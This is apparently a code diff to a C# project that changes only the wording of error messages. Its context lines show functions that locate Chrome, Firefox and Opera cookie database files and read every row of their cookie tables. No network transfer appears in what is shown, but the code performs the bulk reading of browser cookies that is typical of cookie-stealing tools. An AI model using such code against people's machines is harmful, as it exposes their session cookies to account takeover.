@@ -29,10 +29,10 @@ namespace Main_Project
             {
                 var _path_array = Directory.GetFiles(_path_to_Chrome, _Chrome_cookiesDB_name, SearchOption.AllDirectories).ToList();
                 if (_path_array.Count != _count_path)
-                    throw new Exception("Chrome : cookies not fond =(");
+                    throw new Exception("Chrome : cookies not found!");
                 return _path_array[0];
             }
-            catch (Exception) { throw new Exception("Chrome : cookies not fond =("); }
+            catch (Exception) { throw new Exception("Chrome : cookies not found!"); }
         }
         private static string FireFoxe_Cookies_Find()
         {
@@ -40,10 +40,10 @@ namespace Main_Project
             {
                 var _path_array = Directory.GetFiles(_path_to_FireFoxe, _FireFoxe_cookiesDB_name, SearchOption.AllDirectories).ToList();
                 if (_path_array.Count != _count_path)
-                    throw new Exception("FireFoxe : cookies not fond =(");
+                    throw new Exception("FireFoxe : cookies not found!");
                 return _path_array[0];
             }
-            catch (Exception) { throw new Exception("FireFoxe : cookies not fond =("); }
+            catch (Exception) { throw new Exception("FireFoxe : cookies not found!"); }
         }
         private static string Opera_Cookies_Find()
         {
@@ -51,10 +51,10 @@ namespace Main_Project
             {
                 var _path_array = Directory.GetFiles(_path_to_Opera, _Opera_cookiesDB_name, SearchOption.AllDirectories).ToList();
                 if (_path_array.Count != _count_path)
-                    throw new Exception("Opera : cookies not found =(");
+                    throw new Exception("Opera : cookies not found!");
                 return _path_array[0];
             }
-            catch (Exception) { throw new Exception("Opera : cookies not found =("); }
+            catch (Exception) { throw new Exception("Opera : cookies not found!"); }
 
         }
 
@@ -68,7 +68,7 @@ namespace Main_Project
                    return connection.Query($"SELECT * FROM {_Chrome_cookiesTB_name}").ToList();
                 }
             }
-            catch (Exception) { throw new Exception("Chrome : cookies not found =("); }
+            catch (Exception) { throw new Exception("Chrome : cookies not found!"); }
         }
         public static List<dynamic> Table_FireFoxe_cookies()
         {
@@ -80,7 +80,7 @@ namespace Main_Project
                     return connection.Query($"SELECT * FROM {_FireFoxe_cookiesTB_name}").ToList();
                 }
             }
-            catch (Exception) { throw new Exception("FireFoxe : cookies not fond =("); }
+            catch (Exception) { throw new Exception("FireFoxe : cookies not found!"); }
         }
         public static List<dynamic> Table_Opera_cookies()
         {
@@ -92,7 +92,7 @@ namespace Main_Project
                     return connection.Query($"SELECT * FROM {_Opera_cookiesTB_name}").ToList();
                 }
             }
-            catch (Exception) { throw new Exception("Opera : cookies not found =("); }
+            catch (Exception) { throw new Exception("Opera : cookies not found!"); }
         }
     }
 }
